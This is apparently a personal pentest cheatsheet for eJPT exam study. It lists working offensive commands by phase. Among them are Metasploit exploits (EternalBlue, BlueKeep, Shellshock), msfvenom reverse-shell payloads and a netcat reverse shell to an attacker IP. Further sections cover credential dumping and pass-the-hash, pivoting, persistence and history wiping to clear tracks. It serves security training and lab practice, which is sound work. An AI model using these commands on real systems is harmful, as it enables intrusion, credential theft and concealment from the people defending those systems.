# Pentest Methodology Cheatsheet

Quick-reference notes organized around the actual flow of a pentest (recon → enumeration → exploitation → post-exploitation → pivoting → web), instead of a flat list of commands per tool. The goal is to be able to follow this top to bottom during an engagement or an eJPT-style exam and always know "what phase I'm in."

> Originally based on notes shared by a friend, reorganized and expanded with my own practice on TryHackMe/HackTheBox and my own pivoting lab in VirtualBox while preparing for the eJPT v2.

---

## Table of Contents

1. [Passive Reconnaissance](#1-passive-reconnaissance)
2. [Active Reconnaissance](#2-active-reconnaissance)
3. [Port & Service Scanning](#3-port--service-scanning)
4. [Service Enumeration](#4-service-enumeration)
5. [Exploit Search](#5-exploit-search)
6. [Exploitation by Service](#6-exploitation-by-service)
7. [Shells & Payloads](#7-shells--payloads)
8. [Post-Exploitation — Windows](#8-post-exploitation--windows)
9. [Post-Exploitation — Linux](#9-post-exploitation--linux)
10. [Privilege Escalation](#10-privilege-escalation)
11. [Credential Dumping](#11-credential-dumping)
12. [Pivoting / Lateral Movement](#12-pivoting--lateral-movement)
13. [Persistence](#13-persistence)
14. [Clearing Tracks](#14-clearing-tracks)
15. [Web App Pentesting](#15-web-app-pentesting)

---

## 1. Passive Reconnaissance

Everything that can be gathered **without directly touching** the target.

### Whois
```bash
whois <HOST>
whois <IP>
```

### Google Dorking
```
site:target.com
site:*.target.com
site:*.target.com inurl:login
site:*.target.com inurl:admin
site:*.target.com intitle:admin
site:*.target.com intitle:"index of"
intitle:"index of" "credentials"
site:*.target.com inurl:backup
site:*.target.com inurl:.git
site:*.target.com inurl:.env
site:*.target.com filetype:sql
site:*.target.com filetype:log
site:*.target.com filetype:bak
site:*.target.com "confidential"
inurl:"robots.txt"
inurl:"sitemap.xml"
```

### Email Harvesting
```bash
theharvester -d target.com -b all
theharvester -d target.com -b linkedin
theharvester -d target.com -b pgp
```
> In my experience `theharvester` sometimes returns nothing useful — don't skip other sources if it comes up empty.

### Subdomain Enumeration (passive)
```bash
sublist3r -d target.com
```
> Not 100% reliable — unindexed subdomains won't show up. Useful as a first pass, not the only source.

### Common directories to try manually
```
/robots.txt  /sitemap.xml
/admin/  /admin.php  /login/  /login.php
/administrator/  /adminpanel/  /controlpanel/  /cpanel/
/dashboard/  /useradmin/  /backend/  /portal/
/wp-admin/  /phpmyadmin/  /pma/
```

### Web technology fingerprinting
- https://builtwith.com/ — extension = passive
- https://www.wappalyzer.com/ — extension = passive (CLI/API is considered active)

---

## 2. Active Reconnaissance

### Ping Sweep
```bash
fping -a -g 10.10.23.0/24 2>/dev/null
nmap -sn 192.168.1.1
netdiscover -i eth0 -r 192.168.2.0/24
```

### Host Discovery
```bash
nmap -sn -v -T4 10.2.4.5
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 10.2.4.5
```

### Banner Grabbing
```bash
nc 192.105.220.2 22
nmap -sV --script=banner 192.8.94.3
```

### DNS
```bash
dnsrecon -d target.com
```
- DNSDumpster: https://dnsdumpster.com/

### DNS Zone Transfer
```bash
nmap --script=dns-zone-transfer -p 53 target.com
fierce -dns zonetransfer.me
host -l zonetransfer.me nsztm.digi.ninja.
dig axfr @nsztm1.digi.ninja zonetransfer.me
```
> Misconfigured corporate networks sometimes leak internal IPs here.

### Subdomain Enumeration (active)
```bash
sublist3r -d target.com -b brute
amass enum -active -d target.com
```

### Directory Brute Force
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster_results.txt
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt -r -o dirb_results.txt
```

### WAF Detection
```bash
wafw00f target.com -a
```

---

## 3. Port & Service Scanning

### Common ports reference

| Port       | Service  |
|------------|----------|
| 21         | FTP      |
| 22         | SSH      |
| 23         | Telnet   |
| 25         | SMTP     |
| 53         | DNS      |
| 80 / 443   | HTTP/S   |
| 110        | POP3     |
| 139, 445   | SMB      |
| 143        | IMAP     |
| 1433       | MS SQL   |
| 3306       | MySQL    |
| 3389       | RDP      |
| 5985       | WinRM    |

### Typical Nmap scans (order I actually use in an exam/engagement)
```bash
# Fast, good starting point (noisy but thorough)
nmap -sS -A -p- -T4 -sC 192.145.12.4

# If I need to go deeper with all NSE scripts
nmap -sS -A -p- -T4 --script=all 192.145.12.4

# Lighter version, almost always enough
nmap -sS -sV -O -sC -T4 192.145.12.4

# UDP
nmap demo.ine.local -p 1-250 -sU
nmap demo.ine.local -T4 -sU -p 161 -A
```

### With Metasploit
```
db_nmap -Pn -sV -O <TARGET_IP>
hosts
services

use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
```

---

## 4. Service Enumeration

### SMB (445 / 139)
```bash
nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-vuln-* <TARGET_IP>

smbmap -u guest -p "" -d . -H <TARGET_IP>
smbclient -L <TARGET_IP> -N
enum4linux -u <USER> -p <PW> -U <TARGET_IP>
```

### FTP (21)
```bash
nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
ftp <TARGET_IP>   # try anonymous:anonymous
```

### SSH (22)
```bash
nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
```

### HTTP (80/443)
```bash
nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

### MySQL / MSSQL
```bash
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-info <TARGET_IP>
nmap -p 1433 --script=ms-sql-info <TARGET_IP>
nmap -p 1433 --script=ms-sql-empty-password <TARGET_IP>
```

### SMTP (25)
```bash
nmap -p 25 -sV -sC -O <TARGET_IP>
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

---

## 5. Exploit Search

```bash
searchsploit ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit -m /PATH        # copy exploit to current path
searchsploit -w vsftpd       # show web link
```

```
# Metasploit
search type:exploit name:Microsoft IIS
search eternalblue
search bluekeep
```

External sources:
- https://www.exploit-db.com/
- https://www.rapid7.com/db/?type=metasploit

---

## 6. Exploitation by Service

### General brute force (Hydra)
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
  "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
```

### SMB → EternalBlue / PsExec
```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>

use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
```

### WebDAV (IIS, 80)
```bash
davtest -url http://<TARGET_IP>/webdav
cadaver http://<TARGET_IP>/webdav
put /usr/share/webshells/asp/webshell.asp
```
```
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <TARGET_IP>
set HttpUsername <USER>
set HttpPassword <PW>
```

### Samba (Linux)
```
use exploit/linux/samba/is_known_pipename
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
```

### Shellshock
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /gettime.cgi
```

### vsftpd / ProFTPD (known backdoors)
```
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/proftpd_133c_backdoor
```

### WinRM
```bash
crackmapexec winrm <TARGET_IP> -u administrator -p wordlist.txt
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

### RDP (BlueKeep)
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set target <NUMBER>
set GROOMSIZE 50
```
```bash
xfreerdp /u:Administrator /p:<PW> /v:<TARGET_IP>:3389
```

---

## 7. Shells & Payloads

### msfvenom — quick generation
```bash
# Windows
msfvenom -a x64 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f exe > payload64.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f elf > payload64.elf

# ASP webshell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f asp > shell.asp
```

### Upgrading a shell to an interactive TTY (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z to background
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=xterm
reset
```

### Netcat — listener / reverse / bind
```bash
# Listener on attacker
nc -nvlp <PORT>

# Reverse shell on Linux target
nc -nv <ATTACKER_IP> <PORT> -e /bin/bash

# Bind shell on Windows target
nc.exe -nvlp <PORT> -e cmd.exe
```

### Meterpreter → shell to meterpreter (upgrading an existing shell)
```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST <IP>
run
```

---

## 8. Post-Exploitation — Windows

```
sysinfo
getuid
getprivs
pgrep explorer.exe
migrate <PID>
```

```cmd
whoami /priv
net users
net localgroup Administrators
ipconfig /all
netstat -ano
tasklist /SVC
schtasks /query /fo LIST /v
```

Useful modules:
```
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp
```

---

## 9. Post-Exploitation — Linux

```bash
whoami
cat /etc/passwd
uname -a
netstat -antp
ps aux
sudo -l
```

Useful modules:
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
use post/linux/gather/checkcontainer
use post/linux/gather/checkvm
```

---

## 10. Privilege Escalation

### Windows
```
use post/multi/recon/local_exploit_suggester
set SESSION <ID>
run
```
> `getsystem` is the quick first try before hunting for specific kernel exploits.

UAC Bypass:
```
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION 1
run
# then:
ps -S lsass.exe
migrate <PID>
getsystem
```

Token Impersonation:
```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Linux
```bash
# Weak permissions
find / -not -type l -perm -o+w
find / -perm -u=s -type f 2>/dev/null   # SUID

sudo -l   # commands allowed via sudo

# Kernel exploits
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# Cron jobs
crontab -l
```
> Personal note: `sudo -l` is almost always worth checking first — GTFOBins has binaries that many people overlook as a quick escape vector.

---

## 11. Credential Dumping

### Windows
```
migrate -N lsass.exe
hashdump

load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

Pass-the-Hash:
```
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass <LM:NTLM_HASH>
```
```bash
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```

### Linux
```bash
cat /etc/passwd
sudo cat /etc/shadow
```
```
use post/linux/gather/hashdump
```
```bash
john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 12. Pivoting / Lateral Movement

```
# Inside an already-compromised meterpreter session
run autoroute -s 10.0.16.0/20

background
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
```

```bash
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

Port forwarding to reach a second host with no direct route:
```
portfwd add -l 1234 -p 80 -r 10.2.27.45
portfwd list
```

> Flow I actually follow: compromise host 1 → `ipconfig`/`ifconfig` to check for a dual NIC → `autoroute` → scan the internal network with `portscan/tcp` → if something interesting shows up, use `portfwd` instead of trying to hit it directly in a browser (which won't work without forwarding).

---

## 13. Persistence

### Windows
```
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION 1
```

### Linux
```bash
# Via SSH key
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true

# Via cron
echo "* * * * * cd /home/user && python -m SimpleHTTPServer" > cron
crontab -i cron
```

---

## 14. Clearing Tracks

```
clearenv
```
```bash
history -c
cat /dev/null > ~/.bash_history
```

---

## 15. Web App Pentesting

### Curl Enumeration
```bash
curl -I <TARGET_IP>
curl -X OPTIONS <TARGET_IP> -v
curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
```

### WebDAV via PUT method
```bash
echo "Hello World" > hello.txt
curl <TARGET_IP>/uploads/ --upload-file hello.txt
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
```

### WordPress
```bash
curl https://victim.com/ | grep 'content="WordPress'
curl http://blog.example.com/wp-json/wp/v2/users
```
```bash
wpscan --url "http://target.ip" -e vp    # vulnerable plugins
wpscan --url "http://target.ip" -e u     # users
wpscan --url "http://target.ip" --passwords /usr/share/wordlists/rockyou.txt
```
```
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin
set PASSWORD admin
set targeturi /wordpress
```

### Drupal
```
use exploit/unix/webapp/drupal_drupalgeddon2
```
> Detailed Drupalgeddon2 (CVE-2018-7600) writeup: https://ine.com/blog/cve-2018-7600-drupalgeddon-2

### Form Brute Force
```bash
hydra -L usernames.txt -P /root/wordlists/100-common-passwords.txt target.ine.local http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username or password"
```

---

## Personal Notes

- Compiled while studying for the **eJPT v2** (INE Security) — validated against 24+ machines on TryHackMe/HackTheBox and my own pivoting lab in VirtualBox.
- During an exam/engagement, always adapt to the tools actually available in the environment — don't assume everything here will be installed.
- Still to expand: Active Directory / Kerberos section, as I progress further into that area.
